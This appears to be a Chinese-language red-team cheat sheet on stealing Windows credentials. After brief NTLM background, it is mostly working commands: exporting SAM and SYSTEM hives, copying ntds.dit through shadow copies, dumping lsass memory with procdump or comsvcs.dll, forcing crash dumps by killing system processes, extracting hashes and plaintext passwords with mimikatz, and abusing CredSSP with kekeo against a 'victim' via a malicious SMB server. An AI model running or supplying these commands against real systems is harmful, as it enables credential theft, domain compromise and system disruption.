一、    NTLM


Windows系统下Security Account Manager中保存的用户密码hash，生成原理为先转化为16进制，再转化为Unicode，最后做MD4加密。
Win7之前的版本使用LM hash，只支持14位密码，很容易被破解。如果LM为AAD3开头，则说明此系统中LM被弃用。
在网络身份认证中，使用Net-NTLMv2，其使用NTLM对16位随机数进行加密，相当于加了16位的盐，较难被破解。获取Net-NTLMv2，常见于各种\\111.111.111.111\test的SMB共享。
在Net-NTLMv2之前使用Net-NTLMv1，较易被破解。
以上均可以使用hashcat进行破解。
NTLM存储在C:\Windows\System32\config\SAM和lsass.exe中，登录之后，lsass.exe还会存储明文，密码抓取一般从这两个文件中想办法。

三、    SAM
Mimikatz外部加载SAM方法，SAM和SYSTEM都为注册表数据库文件，其不可读不可写。但可用注册表功能导出，其中SYSTEM中存储着密钥，SAM存储着NTLM。

reg save HKLM\SYSTEM D:\Sys.hivreg save HKLM\SAM D:\Sam.hivmimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exit

也可以使用卷影拷贝服务将SAM和SYSTEM复制出来，该功能也常用于复制域控的活动目录数据库文件Ntds.dit。

vssadmin create shadow /for=C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM D:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM D:\sys.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit D:\ntds.ditvssadmin delete shadows /for=c: /quiet

有的时候vsadmin没有create命令，可使用vssown
https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs

vssown.vbs /startvssown.vbs /create ccscript vssown.vbs /listcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM D:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM D:\sys.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit D:\ntds.ditvssown.vbs /delete {D0E1B1B0-96B3-4A5E-988A-4DA2738A078D}


四、    lsass.exe
Mimikatz外部加载lsass.exe方法，先用本地可任务管理器导出内存文件lsass.dmp

mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit" > 1.txt


其他导出lsass.dmp的办法，常用微软的官方procdump
https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

procdump64.exe -accepteula -ma lsass.exe lsass.dmp


本地导出，注意636为PID，可tasklist | findstr lsass查看PID

powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 636 D:\lsass.dmp full"

也可以注册表编辑器打开HKLM\SYSTEM\CurrentControlSet\Control\CrashControl，DWORD值CrashDumpEnabled设置为1，即可开启完全内存转储。

reg add HKLM\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f

改完之后可能需要重启，重启之后再蓝屏，蓝屏的方法可参考一些exp，也可以直接kill wininit.exe csrss.exe。

五、    其他
kekeo
https://github.com/gentilkiwi/kekeo
原理是CredSSP服务器允许客户端传明文密码过来，需客户端开启组策略如下(需重启)

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *

然后受害者机器上先后执行两个kekeo
一个执行tsssp::server，另一个执行tsssp::client /target:anyword
也可以在恶意smb服务器上执行tsssp::server，受害者机器执行

tsssp::client /target:TERMSRV/smb.com /pipe:\\smb.com \pipe\kekeo_tsssp_endpoint
